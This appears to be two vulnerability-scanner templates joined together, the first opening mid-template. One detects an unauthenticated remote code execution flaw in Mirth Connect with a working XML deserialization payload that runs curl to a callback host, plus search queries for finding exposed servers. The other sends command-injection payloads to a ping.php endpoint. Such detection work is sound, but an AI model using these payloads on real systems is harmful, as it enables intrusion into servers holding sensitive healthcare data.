  - group: 1
    internal: true
    name: version
    part: body_1
    regex:
    - (.*)
    type: regex
  matchers:
  - condition: and
    dsl:
    - compare_versions(version, "<4.4.1")
    - contains(interactsh_protocol, "dns")
    - status_code_1 == 200 && status_code_2 == 500
    type: dsl
  raw:
  - 'GET /api/server/version HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: OpenAPI

    '
  - "POST /api/users HTTP/1.1\nHost: {{Hostname}}\nX-Requested-With: OpenAPI\nContent-Type:\
    \ application/xml\n\n<sorted-set>\n    <string>foo</string>\n    <dynamic-proxy>\n\
    \        <interface>java.lang.Comparable</interface>\n        <handler class=\"\
    java.beans.EventHandler\">\n            <target class=\"java.lang.ProcessBuilder\"\
    >\n                <command>\n                    <string>curl</string>\n    \
    \                <string>http://{{interactsh-url}}/</string>\n               \
    \ </command>\n            </target>\n            <action>start</action>\n    \
    \    </handler>\n    </dynamic-proxy>\n</sorted-set>\n"
id: CVE-2023-37679
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:nextgen:mirth_connect:4.3.0:*:*:*:*:*:*:*
    cve-id: CVE-2023-37679
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77
    epss-percentile: 0.99837
    epss-score: 0.93688
  description: 'Mirth Connect, by NextGen HealthCare, is an open source data integration
    platform widely used by healthcare companies. Versions prior to 4.4.1 are vulnerable
    to an unauthenticated remote code execution vulnerability

    '
  impact: 'Unauthenticated attackers can exploit XML deserialization vulnerabilities
    to execute arbitrary code on the Mirth Connect server, potentially compromising
    sensitive healthcare data and integration workflows.

    '
  metadata:
    fofa-query: title="mirth connect administrator"
    google-query: intitle:"mirth connect administrator"
    max-request: 2
    product: mirth_connect
    shodan-query:
    - title:"mirth connect administrator"
    - http.title:"mirth connect administrator"
    vendor: nextgen
    verified: true
  name: NextGen Mirth Connect - Remote Code Execution
  reference:
  - https://www.horizon3.ai/nextgen-mirth-connect-remote-code-execution-vulnerability-cve-2023-43208/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-37679
  - http://mirth.com
  - http://nextgen.com
  - http://packetstormsecurity.com/files/176920/Mirth-Connect-4.4.0-Remote-Command-Execution.html
  remediation: 'Update NextGen Mirth Connect to version 4.4.1 or later that properly
    validates XML input and prevents unsafe deserialization attacks.

    '
  severity: critical
  tags: packetstorm,cve2023,cve,nextgen,rce,vkev,vuln
---
http:
- body: jsondata%5Btype%5D=99&jsondata%5Bip%5D={{command}}
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: or
    part: body
    regex:
    - Windows IP
    - ((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)
    type: regex
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/php/ping.php'
  payloads:
    command:
    - id
    - cmd /c ipconfig
